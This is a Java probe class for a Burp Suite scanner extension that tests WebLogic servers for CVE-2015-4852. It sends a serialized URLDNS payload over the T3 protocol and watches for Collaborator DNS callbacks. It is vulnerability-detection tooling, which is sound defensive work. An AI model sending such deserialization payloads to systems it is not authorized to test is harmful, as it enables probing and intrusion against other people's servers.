package probes;

import burp.*;

import java.io.IOException;
import java.net.Socket;
import java.net.URL;
import java.util.Base64;

public class CVE_2015_4852 extends Probe {
    private static final String NAME = "CVE-2015-4852";
    private static final String SEVERITY = "High";
    private static String detail = "WebLogic has a T3 protocol vulnerability!";

    @Override
    public IScanIssue check(IHttpRequestResponse requestResponse) {
        URL target = Utilities.helpers.analyzeRequest(requestResponse).getUrl();
        String pollPayload = Utilities.collaborator.generatePayload(true);
        boolean vulnerable = false;

        try {
            Socket s = new Socket(target.getHost(), target.getPort());
            s.setSoTimeout(10);

            String result = sendT3Payload(s, URLDNS.getPayloadBytes("http://" + pollPayload));
            s.close();
        } catch (Exception e) {
            e.printStackTrace();
        }

        for (IBurpCollaboratorInteraction interaction : Utilities.collaborator.fetchCollaboratorInteractionsFor(pollPayload)) {
            byte[] rawQuery = Base64.getDecoder().decode(interaction.getProperty("raw_query").getBytes());
            if (rawQuery.length > 0) {
                Utilities.out.println(new String(rawQuery));
            }

            detail = detail + "<br/>"
                    + "Receive a " + interaction.getProperty("type")
                    + " query from " + interaction.getProperty("client_ip")
                    + " at " + interaction.getProperty("time_stamp");

            vulnerable = true;
        }

//        return result.contains("weblogic.jms.common.StreamMessageImpl") ? new WebLogicIssue(requestResponse, NAME, DETAIL, SEVERITY) : null;
        if (vulnerable) {
            return new WebLogicIssue(requestResponse, NAME, detail, SEVERITY);
        } else return null;
    }

}
